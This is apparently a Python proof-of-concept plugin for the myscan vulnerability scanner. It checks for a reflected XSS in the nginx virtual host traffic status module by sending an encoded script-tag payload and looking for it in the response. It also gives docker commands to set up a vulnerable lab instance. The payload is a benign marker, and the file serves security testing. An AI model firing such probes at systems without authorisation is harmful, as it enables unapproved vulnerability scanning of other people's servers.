# !/usr/bin/env python3
# @Time    : 2020/8/21
# @Author  : caicai
# @File    : poc_nginx-module-vts-xss.py

'''
复现：
docker pull gaciaga/nginx-vts:1.11.10-alpine-vts-0.1.12
docker run -P -itd gaciaga/nginx-vts:1.11.10-alpine-vts-0.1.12

'''
from myscan.config import scan_set
from myscan.lib.helper.request import request
from myscan.lib.parse.response_parser import response_parser


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "nginx-module-vts-xss"
        self.vulmsg = '''Nginx virtual host traffic status module XSS'''
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return

        req = {
            "method": "GET",
            "url": self.url + "status%3E%3Cscript%3Exxxxxx(31337)%3C%2Fscript%3E",
            "headers": self.dictdata.get("request").get("headers"),  # 主要保留cookie等headers
            "timeout": 10,
            "verify": False,
        }

        r = request(**req)
        if r != None and r.status_code==200 and b'<script>xxxxxx(31337)</script>' in r.content and b'nginx vhost traffic status monitor' in r.content:
            parser_ = response_parser(r)
            self.result.append({
                "name": self.name,
                "url": self.url,
                "level": self.level,  # 0:Low  1:Medium 2:High
                "detail": {
                    "vulmsg": self.vulmsg,
                    "request": parser_.getrequestraw(),
                    "response": parser_.getresponseraw()
                }
            })